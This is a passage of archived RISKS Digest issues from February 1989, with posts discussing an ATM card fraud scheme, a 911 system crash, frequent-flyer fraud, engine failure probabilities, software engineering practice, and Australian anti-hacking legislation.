month-long investigation with an informant, five people were arrested and
charged with violating federal fraud statutes.  

"Seized in the raid were 1,884 completed counterfeit cards, 4,900 partially
completed cards, and a machine to encode the cards with BofA account
information, including highly secret personal identification numbers for
customers."

The alleged mastermind, Mark Koenig, is a computer programmer for Applied
Communications, Inc. of Omaha, a subsidiary of USWest.  He was temporarily
working under contract for a subsidiary of GTE Corp., which handles the
company's 286 ATMs at stores in California.  Koenig had access to account
information for cards used at the GTE ATMs.  According to a taped
conversation, Koenig said he had transferred the BofA account information
to his home computer.  He took only BofA information "to make it look like
an inside job" at the bank.  The encoding machine was from his office.

Koenig and confederates planned to spread out across the country over six
days around the President's Day weekend, and withdraw cash.  They were to
wear disguises because some ATMs have hidden cameras.  Three "test" cards
had been used successfully, but only a small amount was taken in the tests,
according to the Secret Service.

The prosecuting US attorney estimated that losses to the bank would have
been between $7 and $14 million.  BofA has sent letters to 7,000 customers
explaining that they will receive new cards.

</PRE>
<HR><H3><A NAME="subj1.2">
Massive counterfeit ATM card scheme foiled
</A>
</H3>
<address>
Peter G. Neumann 
&lt;<A HREF="mailto:neumann@csl.sri.com">
neumann@csl.sri.com
</A>&gt;
</address>
<i>
Mon, 13 Feb 1989 13:33:12 PST
</i><PRE>

Note that, whether authorized or surreptitious, any access to the card
information database -- IDs and PINs -- makes this kind of fraud rather easy.
Unfortunately, the remedies are not easy.  Even if the PINs were stored
encrypted, a preencryption attack (offline) enumerating the 10**6 possible PINs
would compromise ALL of the PINs.  Thus I conclude that the vulnerabilities
here are considerable -- and grossly underestimated.  (We have noted before in
RISKS that the extent of credit card fraud is actually enormous, although the
banks merely pass the losses on to the customers.)  PGN

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Computer blamed for 911 system crash
</A>
</H3>
<address>
Rodney Hoffman 
&lt;<A HREF="mailto:Hoffman.ElSegundo@Xerox.com">
Hoffman.ElSegundo@Xerox.com
</A>&gt;
</address>
<i>
12 Feb 89 14:39:12 PST (Sunday)
</i><PRE>

Summarized from a 'Los Angeles Times' (12 Feb 89) story by Hector Tobar:

The Los Angeles city emergency 911 telephone system crashed twice Saturday
afternoon.  Pacific Bell said the shutdown was caused by "a power failure
in the computer's signalling mechanism."  For four hours, the system was
only partly functioning as Pacific Bell engineers worked to repair
computers at the dispatch center.

Operators first discovered the phone lines out about 1 pm.  Pacific Bell
engineers restored parts of the system 5 minutes later, but at 3 pm the
system crashed again.  A backup system also failed, stopping all emergency
calls for 45 minutes.  Engineers once again restored the system's phone
lines at 3:45.  But the system's computers were still not working by late
afternoon and the 25 operators at the dispatch center were forced to
process calls manually.  Computers normally display the address and phone
number of the person making the call.

Operators at the center receive about 200 calls per hour.  Callers who were
unable to get through received a recorded message.  Many then called police
and fire stations directly.  All calls were being answered by late
Saturday.  A police officer said it was fortunate that the breakdown
occurred Saturday afternoon, during a quiet part of the weekend.

The computerized 911 system was installed in Los Angeles in 1983.  Located
four floors below ground level, it is designed to withstand a major
earthquake.  "It's a very good system," said a Pacifc Bell spokeswoman.

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Risks of Selective Service
</A>
</H3>
<address>
Rob Elkins 
&lt;<A HREF="mailto:relkins@vax1.acs.udel.edu">
relkins@vax1.acs.udel.edu
</A>&gt;
</address>
<i>
10 Feb 89 17:20:42 GMT
</i><PRE>

Recently, a fellow student was sent a letter (computer generated of course)
from the U.S. Selective Service System.  The letter was a final warning to
register in the selective service system before their name was submitted to the
Justice Department for felony prosecution.  What is ironic about all this is
that this person is female and not required to register for Selective Service.
Apparently, the computer system that they use maintains a list of female names
and assumes that any individual whose name is not on this list must therefore
be male.  Her full name is Brantley Elizabeth Riley and when she called them to
straighten the situation out, they told her that the system doesn't check
middle names either.
                                 Rob Elkins, University of Delaware

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Re: Engines and probabilities -- independence 
</A>
</H3>
<address>
"Barry Redmond, Lecturer, Telecoms Dept, KevinSt" 
&lt;<A HREF="mailto:BREDMOND@dit.ie">
BREDMOND@dit.ie
</A>&gt;
</address>
<i>
Fri, 3 Feb 89 09:59 GMT
</i><PRE>

In <A HREF="/Risks/8.17.html">RISKS-8.17</A> Craig Smilovitz writes:

&gt;In the discussion about multi-engine aircraft failures, we've seen a lot of
&gt; mathematical probability exercises that forget about analyzing the basis
&gt; assumption about probability theory.  That assumption is the *independence*
&gt; of the events in question.

Exactly.

There are many reasons why the probabilities are not independent.  Just think
about all the factors in common between the engines (2 or 3) on any single
plane:

     -The engines are the same design
     -They were manufactured by the same company
     -They were fitted in the same factory
     -They were fueled from the same tanker
     -They were serviced by the same team
     ...and I'm sure you can all think of others.

If someone makes a mistake on one engine at any of these times, there is a
high probability that they will make the same mistake on the other engine(s).
The probabilities of failure are not independent because if one engine fails it
immediately increases the probability of another failing.

In other words it's another manifestation of the old software debugging rule:
"The more bugs you find, the more likely it is that there are more."

Barry Redmond, Dept of Electronics &amp; Communications, 
Dublin Institute of Technology, Kevin St, Dublin 8 Ireland  

</PRE>
<HR><H3><A NAME="subj4.2">
Re: Engines and Probabilities -- Good math, bad case analysis
</A>
</H3>
<address>
"Robert Frederking" 
&lt;<A HREF="mailto:ref@ztivax.siemens.com">
ref@ztivax.siemens.com
</A>&gt;
</address>
<i>
10 Feb 1989 08:33-MET
</i><PRE>

There was of course a mistake in my submission on the 2/3 engine controversy.
While the P(one or both engines out) I gave was correct for two engines,
this isn't the P(crashing), since it can fly on one engine.  What I should
have used was simply P(both engines out) = p**2, which is indeed smaller
than the P(2 or 3 out) for the three engine case.

Robert Frederking, Siemens AG/ZFE F2 INF 23, 
Otto-Hahn-Ring 6, D-8000 Munich 83  West Germany       Phone: (-89) 636 47129

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Re: Structured programming
</A>
</H3>
<address>
Jim Frost
&lt;<A HREF="mailto:madd@bu-cs.BU.EDU ">
madd@bu-cs.BU.EDU 
</A>&gt;
</address>
<i>
12 Feb 89 16:56:02 GMT
</i><PRE>

It's possible that this topic has been overkilled, but I'd like to add
several recent experiences to the "structured programming" argument.

My company markets a graphical database used for designing and testing event
networks, which work much like PERT charts.  Since the program is very
graphical, it was written for the Silicon Graphics series of machines.  Until
recently, the SGI machines went for $50,000 or more, somewhat limiting our
market.  I was hired to port the system to less expensive hardware.

On paper, the design of the system was very good.  There were several major
portions of code (graphics system, a thing like an interpreter, and a
database).  Unfortunately, the graphics system was written in a very
unstructured format, using many global variables and splitting functions up in
odd ways.  Instead of being able to make small modifications to work on other
graphical systems, a complete rewrite had to be undertaken.  After this
rewrite, porting to new architectures has taken less than a week per
architecture.  The newer graphical systems are very, very structured.

Worse than the graphics, the other portions of the system were written by a
programmer who must have had job security in mind.  They are deliberately
obtuse.  Portions are very modular while others are so delocalized as to cause
me to pound my head against the wall while trying to decipher them (why should
a database manager make checks to see if the memory manager is still
consistent?).  We found that almost all of the modular portions ported with
fair ease, while all of the delocalized portions had to be thrown out and
rewritten.

What's the net result of giving proper structure to the product?  The older
system was so unreliable as to force our clients to run it under a debugger
(gag).  The newer is faster, easy to port, and much MUCH more reliable.

I'd say there's a lesson there.

jim frost, associative design technology                   madd@bu-it.bu.edu

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
 re:  Engineering vs. Programming
</A>
</H3>
<address>
John Dykstra - CDC Workstation Software
&lt;<A HREF="mailto:JohnD@CDCCENTR.BITNET           ">
JohnD@CDCCENTR.BITNET           
</A>&gt;
</address>
<i>
Thu,  9 Feb 89  13:43:16 CST
</i><PRE>

I've had the opportunity to be a logic designer on a high-end mainframe
development project and an operating systems developer.  There's one difference
that leaps out at me:  Hardware designers get to do the same thing more than
once, while software designers, at least in the operating system area, always
seem to be cutting new trails through the underbrush.

In these days of software-compatible product lines, it's not uncommon for the
same hardware development team to implement an external architecture (the
assembly language programmer's view of the machine) several times over the
course of a decade.  My company has two teams that are each on their third
implementation, and you can see progressive improvements in the internal
architecture (what the microprogrammer or customer engineer sees).  Things get
simpler, perform better and are more reliable.  Of course, the constraints the
team works under change (new LSI gate array technologies, requirements to
support more multiprocessing, etc.), but hardware engineers get to learn from
their mistakes.

The "building blocks" of hardware design also have not changed very much over
time.  We're still using registers, adders, control logic, microprogramming
stores, etc.  Techniques get extended over time, but I expect that you could
show a 1950's digital engineer the logic prints for (say) an IBM 3090, and
s/he'd be able to follow them easily.  I don't think that someone who worked in
AutoCoder back in 1960 would be able to read an Ada or LISP program, or even
understand some of the basic concepts of the language.

Operating systems seem to take 5 to 10 years from beginning to maturity, so
most of us only do one or two in a career.  Over a decade, requirements change
enough that you can't just re-implement the previous system.  For example, in
the 60's batch processing was most important, while in the 70's you optimized
for timesharing, and in the 80's distributed processing and networking are
king.  Hardware architectures also change, as support for virtual memory and
hardware-support protection schemes is added, and of course we're using much
different languages.

Basic design principles don't change, and sometimes they get codified into
rulebooks such as "structured programming," and used by people who don't
understand the "why" behind them.  But the problems I'm trying to solve with my
software design work are very different from the ones faced by the guy who
occupied this office in 1979.  Sometimes I'm thrilled by the challenge of
finding my way through this wide-open universe of possible solutions, and
sometimes I wish for the safety of designing yet another pipelined arithmetic
unit.

I'll bet that the hardware designers on this list believe that they're in a
tough situation, and that operating system design is easy! Does anyone want to
make a case for that?

John Dykstra - NOS/VE Design - Control Data Corporation
  (612) 482-2874               JohnD@CDCCentr.BITNET
All opinions expressed, etc.

</PRE>
<HR><H3><A NAME="subj6.2">
Re: Engineering vs. Programming
</A>
</H3>
<address>
&lt;<A HREF="mailto:attcan!utzoo!henry@uunet.UU.NET">
attcan!utzoo!henry@uunet.UU.NET
</A>&gt;
</address>
<i>
Fri, 10 Feb 89 00:16:58 -0500
</i><PRE>

&gt;When you design a program, the design and the program can be one and the
&gt;same, so a lower level of design documentation is possible.

On the one hand, this is certainly true.  I heard the same thing from an
EE friend of mine over a decade ago:  he preferred software over hardware
because changing the software was so much less hassle than updating drawings
and such for hardware.

On the other hand, it is not obvious that this automatically means poorer
quality.  What we have here, actually, is a new version of the classical
debate over whether word processing (or the typewriter!) leads to poorer
writing.  The more powerful tool definitely makes it easier to be
sloppy, because less effort and thought is needed to get something out.
But it also makes it easier to be perfectionist, because doing multiple
iterations to get something absolutely *right* is much less hassle.

I think a fairer statement would be that the shift from hardware to software
magnifies differences in how systematic and conscientious people are, and
makes it harder for traditional hardware-oriented procedures (and older
hardware-oriented managers) to catch the sloppy ones.

                                     Henry Spencer at U of Toronto Zoology
                                 uunet!attcan!utzoo!henry henry@zoo.toronto.edu

</PRE>
<HR><H3><A NAME="subj6.3">
Engineering vs. Programming
</A>
</H3>
<address>
Robert English 
&lt;<A HREF="mailto:renglish%hpda@hp-sde.sde.hp.com">
renglish%hpda@hp-sde.sde.hp.com
</A>&gt;
</address>
<i>
Thu, 9 Feb 89 10:37:57 pst
</i><PRE>

The discussions about software system design have given many reasons for why
those systems fail.  It seems to me that those reasons can be broken into two
main categories--technical and economic--and that any approach that attacks the
first without somehow attacking the second as well is doomed to failure.

The immense complexity of software systems makes them difficult to build
correctly.  A large program can contain well over a hundred thousand lines of
code, each of which would represent a moving part in a physical system.  No one
would expect a physical system that large and complicated to work reliably, at
least not without extensive testing and redundancy.

But the technical problems go deeper than that.  Physical systems are
inherently modular.  Each part has well-defined boundaries and performs
well-defined tasks.  While interactions between parts must be accounted for,
these interactions are the exception, rather than the rule.  Unless
considerable care is taken, the opposite applies to software systems (even with
modular software, the objects themselves tend to be more complex and less
reliable than physical components).

Computer science has made great progress in addressing these technical issues.
The need for documentation is well known, the benefits of proper coding
practices have been well publicized, and the risks of buying or selling
untested code have been demonstrated time after time.  The economic problem
remains unaddressed.

Physical systems take time to build.  Every new part has to be designed and
manufactured.  Prototypes have to be built before they can be evaluated.  It
might take over a year to build a prototype for an automobile, and two or three
years to set up an assembly line for a totally new model.  Compared to such
long product lead times, three or four months of testing are inconsequential.
Developers are not, in general, the people doing the testing, so continued
development is not seriously affected.

Software systems, on the other hand, take very little time to build.  Each
change makes its way into the system in the time it takes to recompile and
reload.  Thus, a software system that takes a year to build will have many
times the complexity of a physical system taking the same amount of time, and
the corresponding testing period should also be many times as long.  In
addition, effective software testing usually requires the same level of skill
as software production, so that investment in testing adversely affects
investment in future development.  By greatly reducing the development time for
a given function, software has greatly increased the relative cost of making
that function reliable.

In a marketplace where time to market is the controlling factor in business
success, there is very little an individual programmer, system designer, or
company can do to oppose these forces.  A company that invests heavily in
building reliable systems will lag far behind the market in other measures of
system quality, such as functionality and performance, and will find itself
limited to those niche markets where reliability is the overriding concern.
Only if the marketplace changes so that those niche markets dominate will
software reliability improve.
                                                 --bob--

</PRE>
<HR><H3><A NAME="subj6.4">
Re: Engineering vs. Programming
</A>
</H3>
<address>
Shawn Stanley
&lt;<A HREF="mailto:shawn@pnet51.cts.com ">
shawn@pnet51.cts.com 
</A>&gt;
</address>
<i>
Thu, 9 Feb 89 14:37:44 CST
</i><PRE>

There will probably always be a difference in opinions between engineers and
programmers.  Although they interact, they are not closely related fields, and
thus have totally different problems.

For example, you can't take a test meter and check a program for discontinuity.
And you generally don't heat-test a program for industrial use.

There are vast differences in debugging techniques, as well as design
techniques.

UUCP: {uunet!rosevax, amdahl!bungia, chinet, killer}!orbit!pnet51!shawn
INET: shawn@pnet51.cts.com

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/8.23.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.25.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-75</DOCNO>
<DOCOLDNO>IA012-000131-B038-22</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/8.25.html 128.240.150.127 19970217025548 text/html 21245
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:54:14 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 8: Issue 25</TITLE>
<LINK REL="Prev" HREF="/Risks/8.24.html">
<LINK REL="Up" HREF="/Risks/index.8.html">
<LINK REL="Next" HREF="/Risks/8.26.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/8.24.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.26.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 8: Issue 25</H1>
<H2> Tuesday 14 February 1989  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I><P><B>
</B><H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
  Authenticity in digital media -- electronic time travel 
</A>
<DD>
<A HREF="#subj1.1">
Steve Philipson
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Bogus Frequent Flyer Scheme 
</A>
<DD>
<A HREF="#subj2.1">
Kenneth R. Jongsma [and Dave Curry]
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Automatic targeting for Maverick missile 
</A>
<DD>
<A HREF="#subj3.1">
Jon Jacky
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Economics, Engineering and Programming 
</A>
<DD>
<A HREF="#subj4.1">
Jerry Leichter
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  RE: ATM Error in Europe 
</A>
<DD>
<A HREF="#subj5.1">
Udo Voges
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Another bank error 
</A>
<DD>
<A HREF="#subj6.1">
Hsiu-Teh Hsieh
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Static Electricity crash 
</A>
<DD>
<A HREF="#subj7.1">
Seth K
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Legal clamp-down on Australian "hackers" 
</A>
<DD>
<A HREF="#subj8.1">
Neil Crellin
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  MIT virus paper available for anonymous ftp 
</A>
<DD>
<A HREF="#subj9.1">
Jon Rochlis
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj10">
  Prospectus for "Computer Viruses" 
</A>
<DD>
<A HREF="#subj10.1">
J Cordani
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Authenticity in digital media -- electronic time travel
</A>
</H3>
<address>
Steve Philipson 
&lt;<A HREF="mailto:steve@aurora.arc.nasa.gov">
steve@aurora.arc.nasa.gov
</A>&gt;
</address>
<i>
Tue, 14 Feb 89 10:18:50 PST
</i><PRE>

   Two nights ago I saw a piece on Headline News that has some interesting
implications.  It seems Hank Williams Jr. found a previously unknown
recording by his father, the late famed country singer Hank Williams, Sr.
Hank Jr. decided that it would be great to make a new recording as a duet
with his long departed Dad.  From the news article, it sounded like the
recording was heavily processed to remove noise and recording artifacts.
In addition, film footage from a very old Kate Smith TV show was heavily
processed to show Hank Sr. singing this song (they implied that he did
NOT perform it on that show), matching mouth movements to the lyrics in
a very convincing manner.  They also managed to merge an adult Hank Jr.
into the scene as if he was there when it is was recorded.  Quite a feat,
as Hank Jr. was probably about 2 years old (or less) at the time.

   The connection with RISKS is that computer/video processing technology
has progressed to the point where seeing is definitely not believing.
Not everyone is aware of this though, so the possibility exists that
public opinion could be manipulated by showing influential people doing
and/or saying things that are solely in the interest of the persons in
control of this technology.  

   This is probably not new break-through in technology, but it is the 
first I've seen of it in national distribution.
							Steve

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Bogus Frequent Flyer Scheme
</A>
</H3>
<address>
&lt;<A HREF="mailto:Kenneth_R_Jongsma@cup.portal.com">
Kenneth_R_Jongsma@cup.portal.com
</A>&gt;
</address>
<i>
Mon, 13-Feb-89 17:10:18 PST
</i><PRE>

Our local paper carried the following Associated Press story this evening:

     An airline ticket agent piled up 1.7 million bonus air miles via computer
   without leaving the ground, then sold the credits for more than $20,000,
   according to a published report.
     Ralf Kwaschni, 28, was arrested Sunday when he arrived for work at
   Kennedy International Airport and was charged with computer tampering
   and grand larceny, authorities said.
     Kwaschni, a ticket agent for Lufthansa Airlines, used to work for
   American Airlines, the Daily News reported today. Police said he used
   his computer access code to create 18 fake American Airline Advantage
   Accounts - racking up 1.7 million bonus air miles, according to the
   newspaper.
     All 18 accounts, five in Kwaschni's name and 13 under fake ones, listed
   the same post office box, according to the newspaper.
     Instead of exchanging the bonus miles for all the free travel, Kwaschni
   sold some of them for $22,500 to brokers, who used the credits to get a
   couple of first class, round trip tickets from New York to Australia,
   two more between London and Bermuda and one between New York and Paris,
   the newspaper said. It is legal to sell personal bonus miles to brokers
   Port Authority Detective Charles Schmidt said.
     Kwaschni would create accounts under common last names, the newspaper
   said. When a person with one of the names was aboard an American flight
   and did not have an Advantage account, the passengers name would be
   eliminated from the flight list and replaced with one from the fake
   accounts, the newspaper said.
     "As the plane was pulling away from the gate, this guy was literally
   wiping out passengers," Schmidt said.

Just continues to show that the greatest security risk is the internal one.
Aside from the obvious mistake of using the same address for all his
accounts, it would be difficult to catch this type of tampering. He was
doing the type of operations that his job requires (adding and deleting
passengers), so one wonders how American caught on.
                                                         Ken Jongsma

         [Also noted by Dave Curry in the San Jose Mercury News.]

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Automatic targeting for Maverick missile
</A>
</H3>
<address>
jon@june.cs.washington.edu 
&lt;<A HREF="mailto:Jon Jacky, University of Washington">
Jon Jacky, University of Washington
</A>&gt;
</address>
<i>
Tue, 14 Feb 89 10:10:14 PST
</i><PRE>

Excerpts from a story in FEDERAL COMPUTER WEEK, 13 Feb 1989, pages 29 and 37:

REDUCING PILOT BURDENS COMES UNDER RAPID FIRE, by Fred Reed

Automatic targeting continues its penetration of the military with the
development of Rapid Fire, an automated fire-control system for the Maverick
air-to-ground missile.  The system, from Hughes Aircraft Co., is typical of
approaches now being investigated by many manufacturers of several types of
weapons . ...  Maverick is a large anti-tank missile that homes in, by means
of a sensor in its nose, on the infrared radiation emitted by tanks and
other vehicles. ...  

According to (Rapid Fire project manager Floyd) Smoller, the processing is
possible with today's computers.  Further, processing is less complex than
in full-scale target recognition systems that seek to identify targets with
certainty. ...  ``The system does not give a hard and fast discrimination
between tanks and other vehicles,'' Smoller said.  ``However, it does favor
tanks, based on variables such as size, aspect ratio and known signature.
It rejects objects in its range that are too large to be vehicles --- roads,
barns and so on.  And it ignores fires so you don't shoot at burning tanks
or forests.''

Having found all candidate targets in its field of view, he said, the system
chooses four targets, if the aircraft carries four missiles.  ``Then, if the
pilot wants, he can simply fire at the targets or he can change the priority
of the targets.  The Air Force never likes to give up the final say on
firing,'' Stoller said. ...

The two trends exemplified by Rapid Fire --- toward integration of computer,
sensors, and weapons and toward increasing automation --- can be seen in many
modern weapons. ...  An Air Force spokesman said Rapid Fire seemed to be a good
system but that the Air Force doesn't have a requirement for it now.

Hughes said it is working on an F-16 application to demonstrate Rapid Fire.
The company believes the system will become more important as close air
support grows in importance.'

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Economics, Engineering and Programming
</A>
</H3>
<address>
LEICHTER-JERRY@CS.YALE.EDU
&lt;<A HREF="mailto:"Jerry Leichter ">
"Jerry Leichter 
</A>&gt;
</address>
<i>
Tue, 14 Feb 89 12:41 EST
</i><PRE>

In a recent RISKS, Robert English points out that much of the pressure that
leads to programs being shipped quickly, without extensive testing, is inhe-
rent in the economic structure of the industry.

He's very right.  The following passage, forwarded to me by a friend, was
taken from an article entitled "Technology and Competitiveness:" by John A.
Young (who is president and CEO of the Hewlett-Packard Company):

	"In today's world, shortening the time between idea stage and finished
	product often makes the difference between success and failure.  The
	high costs of developing new products, the brief time before copies
	appear, and the rapid obsolencence make for a short innovation cycle -
	often 3 to 5 years (6).  A study by the consulting firm McKinsey &amp;
	Company demonstrated that for a typical product with a 5-year life
	span, a 6 month delay in shipping would reduce after-tax profits by
	one third.  A 50% development cost overrun, by contrast, would reduce
	the after-tax profits by only 3.5% (13)."

	bibliography
	(6)  F. Press, in A HIGH TECHNOLOGY GAP (Council on Foreign Relations,
	     New York, 1987) pp. 14-15.
 
	(13) D. G. Reinertsen, WHODUNIT? THE SEARCH FOR THE NEW PRODUCT
	     KILLERS (McKinsey &amp; Company, New York, July 1983).

	[taken from THE BENT of Tau Beta Pi - Winter 1989 issue]


Obviously, not everyone considers "6 month delay in shipping" and "50% deve-
lopment cost overrun" as the only two alternatives.
							-- Jerry

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
RE: ATM Error in Europe (<A HREF="/Risks/8.22.html">RISKS-8.22</A>)
</A>
</H3>
<address>
 KFK/KARLSRUHE - Udo Voges 
&lt;<A HREF="mailto:<IDT766@DKAKFK3.BITNET>  ">
&lt;IDT766@DKAKFK3.BITNET&gt;  
</A>&gt;
</address>
<i>
02/10/89 09:16:11 CET
</i><PRE>

A similar error happened at the postal banking office in Munich: a wrong tape
was mounted on 5 Jan 89 redoing all monthly transfers due at the end of the
month. The error was discovered (due to customer complains?) and repaired the
next working day (9 Jan) and apologies were mailed.
                                                            Udo Voges

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Another bank error
</A>
</H3>
<address>
Console Cowboy
&lt;<A HREF="mailto:vlsi005@ucscj.UCSC.EDU ">
vlsi005@ucscj.UCSC.EDU 
</A>&gt;
</address>
<i>
Sun, 12 Feb 89 02:02:44 -0800
</i><PRE>

This happened about a year ago in a small local bank which has been
expanding its branches so far.  One day I got a letter from a bank (computer
generated one) informing me that my checking account has been closed.  This
was a shock to me, considering the fact that I have never requested my
checking account to be closed.  When I went to the bank to demand an
explanation for the letter, the manager at the bank called up the central
data processing facility in another location, and here is what she told me:
my checking account was closed because it has not been accessed for 3
months, and since the balance was $0.00.  This was correct as far as I knew,
but I have kept the balance in my checking account at $0.00 for over a year
then, since I have a share draft protection which means that whenever there
is not an adequate fund in the checking account, adequate fund are
automatically transferred from my savings account.  So to simplify
bookkeeping, I have kept my checking account on balance $0.00 on purpose.
Also, I had considerable fund in my savings account at the time.

Although the bank manager apologized for this error, I have changed to
another bank since then.

Hsiu-Teh Hsieh, Univ. of Calif., Santa Cruz

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Static Electricity crash
</A>
</H3>
<address>
&lt;<A HREF="mailto:sethk@sco.UUCP">
sethk@sco.UUCP
</A>&gt;
</address>
<i>
Mon Feb 13 14:16:22 1989
</i><PRE>

Jeffrey Mogul (mogul@decwrl.dec.com) mentioned the following in <A HREF="/Risks/8.21.html">RISKS-8.21</A>:

&gt; In RISKS 8.18, Jeff Makey writes about a PDP-11/40 that could be
&gt; crashed by walking across the room and kicking the console terminal,
&gt; thereby transferring a static charge to the console and the CPU.  (...)
&gt; If a PC were this sensitive to static, typewriters would still be big sellers.

Ever since SCO made the big conversion off of PDP-11/44's and on to PC's,
we have been plagued by crashes due to static. While some machines seem
more prone to this problem than others, it seems that any PC with a 
cartridge tape drive has the potential of crashing when the tape is 
inserted (and the correct conditions for static electricity exist). 
The policy recommended for those who handle backups here is to ground 
yourself to the chassis of the machine before/during insertion of the tape.
I do not plan to sell my manual Olivetti typewriter yet.
             -Seth    (sethk@sco.COM)

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
Legal clamp-down on Australian "hackers"
</A>
</H3>
<address>
Neil Crellin 
&lt;<A HREF="mailto:neilc@natmlab.dms.oz.au">
neilc@natmlab.dms.oz.au
</A>&gt;
</address>
<i>
Tue, 14 Feb 89 19:11:12 +1100
</i><PRE>

(Reproduced from The Financial Review, Feb 14th, 1989)

              Clamp on computer hackers, by Julie Power

        Federal Cabinet is expected to endorse today draft legislation
containing tough penalties for hacking into Commonwealth computer systems.
It is understood that the Attorney-General, Mr Lionel Bowen, will be
proposing a range of tough new laws closely aligned with the recommendations
of the Attorney-General's Department released in December.  Mr Bowen
requested the report by the Review of Commonwealth Criminal Law, chaired by
Sir Harry Gibbs, as a matter of urgency because of the growing need to
protect Commonwealth information and update the existing legislation.
	Another consideration could be protection against unauthorised
access of the tax file number, which will be stored on a number of
Government databases.
	If the report's recommendations are endorsed, hacking into
Commonwealth computers will attract a $48,000 fine and 10 years
imprisonment.  In addition, it would be an offence to destroy, erase,
alter, interfere, obstruct and unlawfully add to or insert data in a
Commonwealth computer system.
	The legislation does not extend to private computer systems.
However, the Attorney-General's Department recommended that it would
be an offence to access information held in a private computer via a
Telecom communication facility or another Commonwealth communication
facility without due authority.

Neil Crellin, CSIRO Maths and Stats, Sydney, Australia. (neilc@natmlab.oz.au)
